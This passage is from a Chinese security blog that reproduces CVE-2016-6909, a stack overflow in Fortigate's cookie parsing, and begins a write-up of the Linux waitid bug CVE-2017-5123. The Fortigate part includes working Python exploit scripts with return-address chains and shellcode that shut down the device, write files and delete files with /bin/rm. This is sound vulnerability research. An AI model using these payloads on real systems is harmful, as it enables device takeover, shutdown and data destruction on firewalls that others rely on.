<span class="type">int</span> v10; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> *v11[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v10 = sub_83297EE(*a1, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a2 || (a2 = (_BYTE *)sub_8329B12(a1[<span class="number">34</span>], <span class="string">&quot;Cookie&quot;</span>)) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( *a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v11[<span class="number">0</span>] = (<span class="type">char</span> *)sub_8344CBA(*a1, &amp;a2, <span class="number">59</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v11[<span class="number">0</span>] )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">while</span> ( ((*__ctype_b_loc())[(<span class="type">unsigned</span> __int8)*a2] &amp; <span class="number">0x2000</span>) != <span class="number">0</span> )</span><br><span class="line">        ++a2;</span><br><span class="line">      v2 = (<span class="type">const</span> <span class="type">char</span> *)sub_8344CBA(*a1, v11, <span class="number">61</span>);</span><br><span class="line">      v3 = (<span class="type">const</span> <span class="type">char</span> *)sub_8204B9C(a1);</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v2, v3) )</span><br><span class="line">        sub_820CB5E(v11[<span class="number">0</span>]);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>其中 <code>sub_8329B12()</code> 函数调用了 <code>strcasecmp()</code>，大致分析应当是判断字符串存在性的函数，在这里传入的参数中包含字符串 <code>&quot;Cookie&quot;</code>，那么我们大致可以推测该函数应当是 httpsd （即本进程）中被用以处理 Cookie 相关的函数之一</p><p>局部变量 v3 的求解涉及到函数 <code>sub_8204B9C()</code>，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_8204B9C</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( nCfg_debug_zone )</span><br><span class="line">    v1 = nCfg_debug_zone + <span class="number">45972</span>;</span><br><span class="line">  v2 = sub_8204B37(v1);</span><br><span class="line">  <span class="keyword">return</span> sub_8329797(*a1, (<span class="type">int</span>)<span class="string">&quot;%s_%lu&quot;</span>, <span class="string">&quot;APSCOOKIE&quot;</span>, v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们不难发现其最后调用的 <code>sub_8329797()</code> 传参形式应当是按格式化字符串进行解析，最终拼凑出来的形式应当如 <code>APSCOOKIE_114514</code> （示例数字）的形式，而上层调用中使用 <code>strstr()</code> 判断 v3 在 v2 中是否存在，这个形式我们与我们传入的 Cookie 的内容开头相吻合，由此我们可以推断出接下来的 <code>sub_820CB5E()</code> 函数应当涉及到对 Cookie 的解析工作</p><p>接下来继续分析 <code>sub_820CB5E()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_820CB5E</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">108</span>]; <span class="comment">// [esp+116Ch] [ebp-6Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  size = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">    size = <span class="built_in">strlen</span>(a1) + <span class="number">1</span>;</span><br><span class="line">  src = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x52</span>u);</span><br><span class="line">  v16 = <span class="number">20</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v21, <span class="number">0</span>, <span class="keyword">sizeof</span>(v21));</span><br><span class="line">  ptr = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_820C6F0();</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">sscanf</span>(a1, <span class="string">&quot;Era=%1d&amp;Payload=%[^&amp;]&amp;AuthHash=%s&quot;</span>, &amp;v17, v21, s) == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>做 pwn 的同学应该<strong>第一眼就能够看到一个大大的 %s 映入你的眼帘，十分明显的一个栈溢出</strong>，我们的漏洞便位于这个位置：对 Cookie 内容的解析使用了不安全的 <code>%s</code> 读取 AuthHash 到栈上从而使得其存在栈溢出漏洞</p><blockquote><p>这个年代还有针对 <code>%s</code> 的漏洞属实令人泪目</p></blockquote><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><p>httpsd 为对 init 的软链接，首先我们先对 init 程序进行安全检查：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec ./init</span></span><br><span class="line">[*] &#x27;/home/arttnba3/Desktop/cves/CVE-2016-6909/exploit/init&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">    RPATH:    b&#x27;../lib:../ulib:/fortidev/lib:/lib&#x27;</span><br></pre></td></tr></table></figure><p><strong>保  护  全  关</strong>，我们有相当大的操作空间</p><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>由于其与传统 pwn 题的交互界面不同，我们只有一次 post 的机会，所以需要在这一次 post 中<strong>一  步  到  位</strong>，相应地，虽然我们无法通过交互获取 libc，但是在 init 文件中有着大量的 gadget，又没开 PIE，故直接 ret2text 即可</p><p>先试一下我们是否真的能直接控制程序执行流，随便找一段 gadget 简单试一下，笔者这里选用了一段关机代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:080601AE                 push    4321FEDCh       ; howto</span><br><span class="line">.text:080601B3                 call    _reboot</span><br></pre></td></tr></table></figure><blockquote><p><code>reboot(RB_POWER_OFF)</code></p></blockquote><p>http 请求头的长度毫无疑问能够满足我们对 payload 的要求，故笔者这里直接使用大量的 <code>ret</code> 指令作为 slide code，省去计算溢出长度的必要：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#e = ELF(&#x27;./init&#x27;)</span></span><br><span class="line">url = <span class="string">&#x27;http://192.168.116.100/index&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Length&#x27;</span>:<span class="string">&#x27;12&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>:<span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;gzip,deflate,br&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;PostmanRuntime/7.28.3&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;192.168.116.100&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;APSCOOKIE_3943997904=Era=0&amp;Payload=ëYÿáèøÿÿÿPQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCYz5YoP1z09BbvM8EPqz2NH8Fppto6+R6RL1RIlZRknQ2aojz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8A0p1soM1MUNWPiEHj5+iYl/ktF3u003rzEt+2wfLbQFLRihfLpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&amp;AuthHash=&#x27;</span> + <span class="string">&#x27;\x1c\x8d\x04\x08&#x27;</span> * <span class="number">100</span> + <span class="string">&#x27;\xae\x01\x06\x08&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">r = post(url, headers = headers)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="built_in">print</span>(r.headers)</span><br></pre></td></tr></table></figure><p>可以发现 fortigate VM 被成功关机：</p><blockquote><p>好像没啥意义的截图（）</p></blockquote><p><img src="https://i.loli.net/2021/08/13/NDWXjeBoVsZla8U.png" alt="image.png"></p><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>ROP链的拼接较为繁琐，且对于 <code>%s</code> 而言<strong>空白字符无法被捕获</strong>，由于没有开启 NX 保护，我们可以考虑通过<code>jmp esp</code> 的 gadget 来<strong>直接执行 shellcode</strong></p><p>当然，有的功能其实还是可以直接使用 init 文件中存在的函数的，比如说 open 和 write</p><p><img src="https://i.loli.net/2021/08/14/fr8sKmHFYdP6u5R.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/08/14/KDIwvXnT2OCMGsi.png" alt="image.png"></p><p>下面这段代码调用了 open 进行了文件的创建并向文件内写入了字符串 <code>arttnba3</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment">#e = ELF(&#x27;./init&#x27;)</span></span><br><span class="line">url = <span class="string">&#x27;http://192.168.116.100/index&#x27;</span></span><br><span class="line"></span><br><span class="line">cookie = <span class="string">&#x27;&#x27;</span></span><br><span class="line">cookie += <span class="string">&#x27;APSCOOKIE_3943997904=Era=0&amp;Payload=ëYÿáèøÿÿÿPQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCYz5YoP1z09BbvM8EPqz2NH8Fppto6+R6RL1RIlZRknQ2aojz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8A0p1soM1MUNWPiEHj5+iYl/ktF3u003rzEt+2wfLbQFLRihfLpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&amp;AuthHash=&#x27;</span></span><br><span class="line">cookie += <span class="string">&#x27;\x1c\x8d\x04\x08&#x27;</span> * <span class="number">100</span> <span class="comment"># ret</span></span><br><span class="line">cookie += <span class="string">&#x27;\xf7\xbd\x96\x08&#x27;</span> <span class="comment"># add eax, ebp ; jmp esp</span></span><br><span class="line"><span class="comment"># following are shellcode</span></span><br><span class="line">cookie += <span class="string">&#x27;\x90&#x27;</span> * <span class="number">0x80</span> <span class="comment"># slide code nop</span></span><br><span class="line">cookie += <span class="string">&#x27;1\xc0PhflagTXjBP\xbb$\xe3\x05\x08\xff\xd31\xc9Qhnba3harttT[j\x08SP\xbb\x84\xb5\x05\x08\xff\xd3&#x27;</span> <span class="comment"># &#x27;xor eax, eax ; push eax ; push 0x67616c66 ; push esp ; pop eax ; push 0102 ; push eax ; mov ebx, 0x805E324 ; call ebx ; xor ecx, ecx ; push ecx ; push 0x3361626e ; push 0x74747261 ; push esp ; pop ebx ; push 8 ; push ebx ; push eax ; mov ebx, 0x805B584 ; call ebx&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Length&#x27;</span>:<span class="string">&#x27;12&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>:<span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;gzip,deflate,br&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;PostmanRuntime/7.28.3&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;192.168.116.100&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>:cookie</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">r = post(url, headers = headers)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="built_in">print</span>(r.headers)</span><br></pre></td></tr></table></figure><p>发送 http 请求，我们成功地在防火墙内创建文件并写入特定内容</p><p><img src="https://i.loli.net/2021/08/14/yWfmvxl4DKPBGc1.png" alt="image.png"></p><p>下列 shellcode 通过系统调用 execve 调用 <code>/bin/rm</code> 删除我们的 flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cookie += <span class="string">&#x27;1\xc0Ph//rmh/binT[PhflagTYPQSTY\x89\xc2@@@@@@@@@@@\xcd\x80&#x27;</span> <span class="comment"># &#x27;xor eax, eax ; push eax ; push 0x6d722f2f ; push 0x6e69622f ; push esp ; pop ebx ; push eax ; push 0x67616c66 ; push esp ; pop ecx ; push eax ; push ecx ; push ebx ; push esp ; pop ecx ; mov edx, eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; int 0x80&#x27;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>发送 http 请求，可以看到 flag 文件已被删除</p><p><img src="https://i.loli.net/2021/08/14/I2PUGYa5TSoXuvN.png" alt="image.png"></p><p>接下来我们便可以使用自己构造的 shellcode 为所欲为了，网上也有很多 shellcode 生成工具，这里笔者便不再独立贴出其他 shellcode 了</p><h1 id="0x03-What’s-more…"><a href="#0x03-What’s-more…" class="headerlink" title="0x03.What’s more…"></a>0x03.What’s more…</h1><p>安全产品是为了确保安全而引入的，但安全产品又会有新的安全问题，这个时候又要引入新的安全产品来确保安全产品的安全，然后便是无限套娃…</p><p>笔者认为，<strong>「安全问题本质上还是人的问题」</strong>，只有我们每一位开发者都真正重视起安全问题，很多没有必要的损失才能得以避免</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;彁我着🔥了.jpg&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="ret2text" scheme="http://blog.arttnba3.cn/tags/ret2text/"/>
    
    <category term="ROP" scheme="http://blog.arttnba3.cn/tags/ROP/"/>
    
    <category term="栈溢出" scheme="http://blog.arttnba3.cn/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="ret2shellcode" scheme="http://blog.arttnba3.cn/tags/ret2shellcode/"/>
    
    <category term="shellcode" scheme="http://blog.arttnba3.cn/tags/shellcode/"/>
    
    <category term="Fortigate" scheme="http://blog.arttnba3.cn/tags/Fortigate/"/>
    
  </entry>
  
  <entry>
    <title>【CVE.0x02】CVE-2017-5123 waitid 漏洞复现及简要分析</title>
    <link href="http://blog.arttnba3.cn/2021/08/03/CVE-0X02-CVE-2017-5123/"/>
    <id>http://blog.arttnba3.cn/2021/08/03/CVE-0X02-CVE-2017-5123/</id>
    <published>2021-08-02T16:42:16.000Z</published>
    <updated>2022-05-16T16:37:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>今晚别睡太死.jpg</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><h2 id="waitid-系统调用"><a href="#waitid-系统调用" class="headerlink" title="waitid 系统调用"></a>waitid 系统调用</h2><p>waitid 是 Linux 中的一个系统调用，该系统调用与 <code>wait</code> 系统调用相类似，用以获取一个进程的状态改变</p><p>原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">waitid</span><span class="params">(<span class="type">idtype_t</span> idtype, <span class="type">id_t</span> id, <span class="type">siginfo_t</span> *infop, <span class="type">int</span> options)</span>;</span><br><span class="line">                       <span class="comment">/* This is the glibc and POSIX interface; see</span></span><br><span class="line"><span class="comment">                          NOTES for information on the raw system call. */</span></span><br></pre></td></tr></table></figure><ul><li><code>idtype</code> ：用以指定等待的子进程类型：P_PID（等待特定进程）、P_PGID（等待特定进程组）、P_ALL（等待任意子进程）</li><li><code>id</code> ：等待的子进程 pid</li><li><code>infop</code>：该结构体用以存储 waitid 获取到的子进程相关信息，可以理解为 waitid 对返回值的补充</li><li><code>options</code> ：指定获取的子进程类型（正常终止、因信号暂停…）</li></ul><p>其中 <code>siginfo_t</code> 结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/siginfo.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">sigval</span> &#123;</span></span><br><span class="line"><span class="type">int</span> sival_int;</span><br><span class="line"><span class="type">void</span> *sival_ptr;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">int</span> si_signo;</span><br><span class="line"><span class="type">int</span> si_code;</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">sigval</span> <span class="title">si_value</span>;</span></span><br><span class="line"><span class="type">int</span> si_errno;</span><br><span class="line"><span class="type">pid_t</span> si_pid;</span><br><span class="line"><span class="type">uid_t</span> si_uid;</span><br><span class="line"><span class="type">void</span> *si_addr;</span><br><span class="line"><span class="type">int</span> si_status;</span><br><span class="line"><span class="type">int</span> si_band;</span><br><span class="line">&#125; <span class="type">siginfo_t</span>;</span><br></pre></td></tr></table></figure><blockquote><p>更多信息参见<a href="https://www.mkssoftware.com/docs/man5/siginfo_t.5.asp">这里</a></p></blockquote><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>在 waitid 向 infop 中写入数据时未对其地址进行检查，导致用户可以传入一个内核空间中的地址，从而<strong>非法向内核空间写入数据</strong></p><h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>Linux v4.13~4.14-rc5。Linux v4.14-rc5 和 Linux v4.14.1已修补，Linux v4.14-rc4未修补</p><blockquote><p>昙花一现的一个漏洞，信息甚少，而且说实话不是很好利用…</p></blockquote><h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01.漏洞分析"></a>0x01.漏洞分析</h1><h2 id="Pre-用户空间与内核空间的数据传递"><a href="#Pre-用户空间与内核空间的数据传递" class="headerlink" title="Pre.用户空间与内核空间的数据传递"></a>Pre.用户空间与内核空间的数据传递</h2><p>通常情况下使用函数 <code>put_user()</code> &#x2F; <code>get_user()</code>或是 <code>copy_from_user()</code> &#x2F; <code>copy_to_user()</code> 等在用户空间与内核空间之间复制数据，而完成这样的操作我们需要完成：</p><ul><li>检查地址合法性</li><li>禁用&#x2F;启用 SMEP 保护</li></ul><p>而 waitid 系统调用需要向用户空间上多次写入数据（siginfo_t），为了避免额外的开销，自内核 4.13 版本起使用 <code>unsafe_put_user()</code> 来向用户空间写入数据，从而避免多次检查&#x2F;开关保护造成的额外开销</p><p>该宏定义于 <code>/arch/x86/include/asm/uaccess.h</code>，其中有段说明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The &quot;unsafe&quot; user accesses aren&#x27;t really &quot;unsafe&quot;, but the naming</span></span><br><span class="line"><span class="comment"> * is a big fat warning: you have to not only do the access_ok()</span></span><br><span class="line"><span class="comment"> * checking before using them, but you have to surround them with the</span></span><br><span class="line"><span class="comment"> * user_access_begin/end() pair.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unsafe_put_user(x, ptr, label)\</span></span><br><span class="line"><span class="meta">__put_user_size((__typeof__(*(ptr)))(x), (ptr), sizeof(*(ptr)), label)</span></span><br></pre></td></tr></table></figure><p>即正常情况下使用时我们不仅要使用 <code>access_ok()</code> 检查用户空间地址<strong>合法性</strong>，还需要使用 <code>user_access_begin()</code> 与 <code>user_access_end()</code> 以完成 <strong>SMAP 保护的关&#x2F;开</strong>工作</p><p>这个宏最后展开为宏 <code>__put_user_goto</code>，使用内联汇编赋值，出错则跳转到 label 处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Tell gcc we read from memory instead of writing: this is because</span></span><br><span class="line"><span class="comment"> * we do not write to any memory gcc knows about, so there are no</span></span><br><span class="line"><span class="comment"> * aliasing issues.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __put_user_goto(x, addr, itype, ltype, label)\</span></span><br><span class="line"><span class="meta">asm_volatile_goto(<span class="string">&quot;\n&quot;</span>\</span></span><br><span class="line"><span class="meta"><span class="string">&quot;1:mov&quot;</span>itype<span class="string">&quot; %0,%1\n&quot;</span>\</span></span><br><span class="line"><span class="meta">_ASM_EXTABLE_UA(1b, %l2)\</span></span><br><span class="line"><span class="meta">: : ltype(x), <span class="string">&quot;m&quot;</span> (__m(addr))\</span></span><br><span class="line"><span class="meta">: : label)</span></span><br></pre></td></tr></table></figure><h3 id="access-ok：检查地址合法性"><a href="#access-ok：检查地址合法性" class="headerlink" title="access_ok：检查地址合法性"></a>access_ok：检查地址合法性</h3><p>宏 <code>access_ok()</code> 用以检查一个 <strong>应当指向用户空间的指针</strong> 是否合法，即其所指向的这块区域是否超出了用户空间的范围，定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 